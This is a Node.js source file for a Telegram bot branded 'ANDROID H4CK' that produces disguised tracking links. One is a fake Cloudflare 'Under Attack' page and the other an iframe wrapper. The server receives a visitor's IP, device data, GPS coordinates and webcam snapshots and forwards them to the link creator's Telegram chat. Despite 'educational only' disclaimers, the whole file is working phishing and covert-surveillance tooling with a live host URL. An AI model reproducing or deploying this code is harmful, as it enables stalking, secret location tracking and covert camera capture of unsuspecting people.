require('dotenv').config();
const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="https://promotion100plus.koyeb.app";
//TOGGLE for Shorters
var use1pt=false;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/attack_actionBot");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

  

if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/attack_actionBot");
}

         
                              
});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `🤖 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐇4𝐂𝐊 — 𝐑𝐄𝐓𝐔𝐑𝐍 𝐎𝐅 𝐒𝐇𝐈𝐍𝐈𝐓𝐀
_⚔️ 𝐂𝐎𝐒𝐌𝐈𝐂 𝐖𝐀𝐑𝐑𝐈𝐎𝐑 𝐈𝐍𝐓𝐄𝐋𝐋𝐈𝐆𝐄𝐍𝐂𝐄 𝐁𝐎𝐓  ⚔️_

━━━━━━━━━━━━━━━━━━
👋 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 , ${msg.chat.first_name}!
━━━━━━━━━━━━━━━━━━

TᕼIՏ ᗷOT ᕼᗴᒪᑭՏ YOᑌ ᘜᗴᑎᗴᖇᗩTᗴ ՏᗰᗩᖇT TᖇᗩᑕKIᑎᘜ ᒪIᑎKՏ TO ᗩᑎᗩᒪYᘔᗴ ᑌՏᗴᖇ ᗴᑎᘜᗩᘜᗴᗰᗴᑎT & TᗴᑕᕼᑎIᑕᗩᒪ ᗪᗩTᗩ.

🔍 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒:
• 𝙳𝙴𝚅𝙸𝙲𝙴 & 𝙱𝚁𝙾𝚆𝙴𝚁𝚂 𝙳𝙴𝚃𝙴𝙲𝚃𝙸𝙾𝙽  
• 𝙰𝙿𝙿𝚁𝙾𝚇𝙸𝙼𝙰𝚃𝙴 𝙻𝙾𝙲𝙰𝚃𝙸𝙾𝙽
• 𝚃𝙴𝙲𝙷𝙽𝙸𝙲𝙰𝙻 𝚅𝙸𝚂𝙸𝚃 𝙸𝙽𝙵𝙾
• 𝙵𝙰𝚂𝚃 𝙻𝙸𝙽𝙺 𝚃𝚁𝙰𝙲𝙺𝙸𝙽𝙶

🛡️ 𝐔𝐒𝐀𝐆𝐄 𝐍𝐎𝐓𝐈𝐂𝐄:
𝙵𝙾𝚁 𝙴𝙳𝚄𝙲𝙰𝚃𝙸𝙾𝙽 & 𝚂𝙴𝙲𝚄𝚁𝙸𝚃𝚈 - 𝙰𝚆𝙰𝚁𝙴𝙽𝙴𝚂𝚂 𝙿𝚄𝚁𝙿𝙾𝚂𝙴 𝙾𝙽𝙻𝚈.

━━━━━━━━━━━━━━━━━━
📌 𝐆𝐄𝐓 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 
𝐓𝐘𝐏𝐄 /help 𝐓𝐎 𝐒𝐄𝐄 𝐀𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒.
━━━━━━━━━━━━━━━━━━

🌌 _𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐇4𝐂𝐊  — 𝐏𝐎𝐖𝐄𝐑𝐈𝐍𝐆 𝐓𝐇𝐄 𝐂𝐎𝐒𝐌𝐈𝐂 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐈𝐎𝐍 🌌`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,`🛰 ANDROID H4CK — SHINITA Cosmic Warrior
Advanced Link Intelligence & Analysis Bot

━━━━━━━━━━━━━━━━━━
🔗 What this bot does
━━━━━━━━━━━━━━━━━━
Through this bot, you can generate smart tracking links to analyze how users interact with shared URLs.

It is commonly used for:
• Security awareness testing  
• Traffic & device analytics  
• Educational demonstrations  
• Link behavior analysis  

━━━━━━━━━━━━━━━━━━
🚀 How to Get Started
━━━━━━━━━━━━━━━━━━
1️⃣ click /create
2️⃣ You will be asked to provide a destination URL  
3️⃣ The bot will generate two analysis links for you  

━━━━━━━━━━━━━━━━━━
⚙️ Link Types Explained
━━━━━━━━━━━━━━━━━━

1️⃣ Cloudflare Intelligence Link
• Displays a Cloudflare “Under Attack” verification page  
• Collects general technical visit data  
• Automatically redirects to your destination URL  

2️⃣ WebView Analysis Link
• Loads the destination website inside an iframe  
• Useful for compatible sites (news, blogs, landing pages)  

⚠️ Note: Some websites block iframe usage using
X-Frame-Options (e.g. Google, some banking sites).

━━━━━━━━━━━━━━━━━━
📺 Video Tutorial
━━━━━━━━━━━━━━━━━━
Watch the full setup guide on YouTube:  
👉 <a href="https://youtube.com/shorts/nepY9iD16wQ?si=fyI77zXk_rEyyQHm">Click here to watch</a>

━━━━━━━━━━━━━━━━━━
🛡 Usage Notice
━━━━━━━━━━━━━━━━━━
This tool is intended for educational, analytical, and security-testing purposes only.  
You are responsible for complying with local laws and platform policies.

━━━━━━━━━━━━━━━━━━
📌 Type /help to view all available commands.
━━━━━━━━━━━━━━━━━━

🌌ANDROID H4CK — Precision. Power. Intelligence.🌌
`);
}
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;

var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if( uid != null && data != null){

 
if(data.indexOf(ip) < 0){
return res.send("ok");
}

data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});



app.listen(8000, () => {
console.log("App Running on Port 5000!");
});
